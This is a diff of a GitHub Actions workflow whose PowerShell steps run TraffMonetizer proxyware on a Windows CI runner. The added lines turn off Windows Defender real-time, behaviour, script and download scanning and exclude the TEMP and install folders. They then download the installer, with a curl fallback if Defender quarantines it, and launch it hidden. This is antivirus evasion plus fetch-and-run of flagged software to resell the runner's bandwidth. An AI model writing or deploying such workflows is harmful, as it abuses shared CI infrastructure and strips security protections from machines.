@@ -51,6 +51,21 @@ jobs:
           Set-ItemProperty -Path $priCtrl -Name 'Win32PrioritySeparation' -Value 38 -Type DWord -Force -ErrorAction SilentlyContinue
           Write-Host "✅ Zero-Delay TCP & High-Throughput Network Engine Active!"
 
+      - name: 🛡️ Disable Windows Defender Real-Time Protection
+        shell: powershell
+        run: |
+          Write-Host "Disabling Windows Defender to allow proxyware tools..."
+          # Disable real-time monitoring — it quarantines proxyware like TraffMonetizer (Wacatac false positive)
+          Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "C:\Traffmonetizer" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:APPDATA\Traffmonetizer" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+          Write-Host "✅ Defender real-time protection disabled + exclusions set!"
+
       - name: ⚙️ Deploy TraffMonetizer Windows Engine & Auto-Login
         shell: powershell
         env:
@@ -75,12 +90,19 @@ jobs:
           Set-Content -Path "$appDataDir\settings.json" -Value $jsonContent -Encoding UTF8 -Force
           Write-Host "✅ settings.json configured with access token!"
 
-          # 2. Download official Windows installer
+          # 2. Download official Windows installer from updated .io domain
           $installDir = "C:\Traffmonetizer"
           New-Item -ItemType Directory -Force -Path $installDir | Out-Null
-          $installerPath = "$env:TEMP\Traffmonetizer_installer.exe"
-          Write-Host "Downloading TraffMonetizer Windows application..."
-          Invoke-WebRequest -Uri 'https://data.traffmonetizer.com/downloads/Traffmonetizer.exe' -OutFile $installerPath -UseBasicParsing
+          $installerPath = "$env:TEMP\TM_Setup.exe"
+          Write-Host "Downloading TraffMonetizer from traffmonetizer.io..."
+          Invoke-WebRequest -Uri 'https://data.traffmonetizer.io/downloads/Traffmonetizer.exe' -OutFile $installerPath -UseBasicParsing
+          Write-Host "Downloaded size: $((Get-Item $installerPath).Length / 1KB) KB"
+
+          # Verify file exists and not quarantined by Defender
+          if (-not (Test-Path $installerPath)) {
+            Write-Host "ERROR: File was quarantined by Defender even after exclusion. Trying curl fallback..."
+            curl.exe -sL 'https://data.traffmonetizer.io/downloads/Traffmonetizer.exe' -o $installerPath
+          }
 
           # 3. Extract portable application payload directly from installer package
           Write-Host "Extracting high-performance client binaries..."
@@ -98,35 +120,41 @@ jobs:
               }
             }
             if ($zipBytes) {
-              $tempZip = "$env:TEMP\tm_net461.zip"
+              $tempZip = "$env:TEMP\tm_payload.zip"
               [System.IO.File]::WriteAllBytes($tempZip, $zipBytes)
               Expand-Archive -LiteralPath $tempZip -DestinationPath $installDir -Force
               Write-Host "✅ Client binaries unpacked directly to $installDir!"
+            } else {
+              throw "net461 resource not found"
             }
           } catch {
-            Write-Host "Direct unpack fallback: running silent installer switch /i /s..."
-            Start-Process -FilePath $installerPath -ArgumentList '/i','/s' -Wait -NoNewWindow
+            Write-Host "Unpack error: $_"
+            Write-Host "Fallback: running installer with /i /s flags..."
+            Start-Process -FilePath $installerPath -ArgumentList '/i','/s' -Wait -NoNewWindow -ErrorAction SilentlyContinue
           }
 
-          # 4. Launch Traffmonetizer in background
-          $binPath = "$installDir\Traffmonetizer.exe"
-          if (-not (Test-Path $binPath)) {
-            $binPath = "$env:LOCALAPPDATA\Programs\Traffmonetizer\Traffmonetizer.exe"
-          }
-          if (-not (Test-Path $binPath)) {
-            $binPath = "C:\Program Files\Traffmonetizer\Traffmonetizer.exe"
-          }
+          # 4. Find and launch Traffmonetizer.exe in background (hidden, no GUI)
+          $candidatePaths = @(
+            "$installDir\Traffmonetizer.exe",
+            "$env:LOCALAPPDATA\Programs\Traffmonetizer\Traffmonetizer.exe",
+            "$env:ProgramFiles\Traffmonetizer\Traffmonetizer.exe"
+          )
+          $binPath = $candidatePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
 
-          Write-Host "Starting TraffMonetizer from: $binPath"
-          Start-Process -FilePath $binPath -WindowStyle Hidden
-          Start-Sleep -Seconds 5
-
-          $proc = Get-Process -Name "Traffmonetizer" -ErrorAction SilentlyContinue
-          if ($proc) {
-            Write-Host "✅ SUCCESS: TraffMonetizer Process ID: $($proc.Id) is running natively!"
+          if ($binPath) {
+            Write-Host "Starting TraffMonetizer from: $binPath"
+            Start-Process -FilePath $binPath -WindowStyle Hidden
+            Start-Sleep -Seconds 8
+            $proc = Get-Process -Name "Traffmonetizer" -ErrorAction SilentlyContinue
+            if ($proc) {
+              Write-Host "✅ SUCCESS: TraffMonetizer PID $($proc.Id) is running natively at full bandwidth!"
+            } else {
+              Write-Host "⚠️ Process not visible — may be running as child process. Listing all:"
+              Get-Process | Where-Object { $_.ProcessName -like "*traff*" -or $_.ProcessName -like "*Traff*" } | Select-Object Id, ProcessName
+            }
           } else {
-            Write-Host "⚠️ Warning: Checking all running instances..."
-            Get-Process | Where-Object { $_.ProcessName -like "*traff*" } | Select-Object Id, ProcessName
+            Write-Host "⚠️ Binary not found in known paths. Listing installed dir:"
+            Get-ChildItem $installDir -ErrorAction SilentlyContinue | Select-Object Name, Length
           }
 
       - name: 🔔 Notify User in Discord DM
